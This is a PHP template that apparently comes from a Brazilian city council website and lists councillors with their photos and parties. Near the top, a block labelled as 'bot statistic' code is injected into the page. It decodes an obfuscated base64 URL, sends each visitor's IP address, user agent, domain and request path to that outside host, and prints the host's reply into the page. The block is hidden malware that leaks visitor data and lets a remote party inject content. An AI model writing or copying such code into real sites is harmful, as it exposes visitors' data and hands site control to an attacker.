<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tparametro.php");
include_once("../library/config/database/tvereador.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Vereadores");
$oMasterPage->AddParameter("css", "vereadores/index");
$oMasterPage->AddParameter("pagina", "vereadores");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<h1>Vereadores</h1>
<div class="legislatura"><strong><?=tparametro::Get("legislatura-ano");?>º Legislatura</strong> - <?=tparametro::Get("legislatura-duracao");?></div>
<?php

$oVereador = new tvereador();
$oVereador->SQLField = "tvereador.*, tpartido.Sigla as Partido";
$oVereador->SQLJoin = "INNER JOIN tpartido ON tpartido.ID = tvereador.PartidoID";
$oVereador->SQLOrder = "tvereador.Nome ASC";
if($oVereador->LoadSQLAssembled())
{
	?>

	<div class="listagem row">


	    	<?php
			for($c = 0; $c < $oVereador->NumRows; $c++)
			{
				$urlVereador = $oVereador->GenerateURL();
				?>
                <div class="col-md-4 col-xs-6 vereador " >

		        	<!--<table cellpadding="0" cellspacing="0" width="100%">
		            	<tr>-->
		            		<?php
		            		
		                	if($oVereador->Imagem)
		                	{
		                		?>
			                	<!--<td class="mask" width="140"> -->
									<a href="<?=$urlVereador;?>">
										<span></span>
										<img src="<?=$oVereador->Thumbnail($oVereador->Imagem, 175, 211, "", true);?>" alt="<?=utf8_encode($oVereador->Nome);?>" title="<?=utf8_encode($oVereador->Nome);?>" class="img-responsive" />
									</a>
								<!--</td>-->
								<?php
			                }
			                
			                ?>
		                   <!-- <td> -->
		                        <h3><a href="<?=$urlVereador;?>"><?=utf8_encode($oVereador->Nome);?></a></h3>
								<p class="partido">Partido: <a href="<?=$urlVereador;?>" class="zwo6"><?=$oVereador->Partido;?></a></p>
		                        <p class="last"><a href="<?=$urlVereador;?>" class="botPerfil ">Veja seu perfil</a></p>
                    <!--  </td>
                 </tr>
             </table>-->

                </div>

		        <?php
                    if(($c+1)%3==0) {
                        echo ('<div class="clear hidden-xs hidden-sm"></div>');
                    }

                if(($c+1)%2==0) {
                    echo ('<div class="clear hidden-md hidden-lg"></div>');
                }
		        $oVereador->MoveNext();
			}
			?>

	</div>
	<?php
}
else
{
	?>
	<p>Nenhum registro encontrado.</p>
	<?php
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>